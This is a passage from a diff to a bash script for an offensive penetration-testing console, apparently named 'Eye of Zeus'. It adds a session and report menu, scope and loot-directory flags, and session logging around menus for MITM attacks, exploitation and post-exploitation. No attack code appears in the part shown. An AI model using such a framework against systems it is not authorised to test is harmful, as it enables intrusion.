+        2) echo -e "${HYPR_CYAN}${BOLD}Loot: $LOOT_DIR${RESET}"; ls -la "$LOOT_DIR" ;;
+        3) self_update ;;
+        4) show_version
+           echo -e "${HYPR_CYAN}Loot:  $LOOT_DIR${RESET}"
+           echo -e "${HYPR_CYAN}Scope: ${SCOPE_FILE:-none}${RESET}" ;;
+        5) return ;;
+        *) echo -e "${DEBIAN_RED}${BOLD}[✗] Invalid option${RESET}" ;;
+    esac
+    echo -e "\n${HYPR_YELLOW}${BOLD}[↵] Press Enter to continue...${RESET}"
+    read -r
+}
+
 # Main menu
 main_menu() {
     while true; do
@@ -895,7 +1229,8 @@ main_menu() {
         menu_item 2 "MITM Attacks"
         menu_item 3 "Exploitation"
         menu_item 4 "Post-Exploitation"
-        menu_item 5 "Exit" "$DEBIAN_RED"
+        menu_item 5 "Session & Report"
+        menu_item 6 "Exit" "$DEBIAN_RED"
         echo -ne "\n${HYPR_YELLOW}${BOLD}[?] Select option: ${RESET}"
         read -r choice
 
@@ -913,6 +1248,9 @@ main_menu() {
                 post_exploitation
                 ;;
             5)
+                session_menu
+                ;;
+            6)
                 echo -e "${DEBIAN_GREEN}${BOLD}[✓] Exiting Eye of Zeus... Stay stealthy!${RESET}"
                 exit 0
                 ;;
@@ -926,14 +1264,38 @@ main_menu() {
 
 # Main function
 main() {
+    # CLI flags (these run before the root check so --help/--version/--update work
+    # for an unprivileged user).
+    while [ $# -gt 0 ]; do
+        case "$1" in
+            -h|--help)    show_help; exit 0 ;;
+            -V|--version) show_version; exit 0 ;;
+            --update)     self_update; exit $? ;;
+            --scope)      EOZ_SCOPE_FILE="$2"; shift ;;
+            --no-scope)   EOZ_NO_SCOPE=1 ;;
+            --loot)       EOZ_LOOT_BASE="$2"; shift ;;
+            *) echo "Unknown option: $1"; show_help; exit 1 ;;
+        esac
+        shift
+    done
+
     check_root
+    load_scope
+    init_loot
+    start_session_log
     banner
     type_text ">> Booting Eye of Zeus attack framework..." "$HYPR_MAGENTA" 0.01
     loading_bar "Initializing modules" 24 0.015
     check_dependencies
+    echo -e "${HYPR_CYAN}${BOLD}[i] Loot directory: $LOOT_DIR${RESET}"
+    if [ -s "$SCOPE_FILE" ]; then
+        echo -e "${HYPR_CYAN}${BOLD}[i] Scope: $SCOPE_FILE${RESET}"
+    else
+        echo -e "${HYPR_YELLOW}${BOLD}[i] Scope: none ($SCOPE_FILE) — targets will require confirmation${RESET}"
+    fi
     type_text ">> Ready. Launching console..." "$DEBIAN_GREEN" 0.01
     sleep 0.4
     main_menu
 }
 
-main
+main "$@"
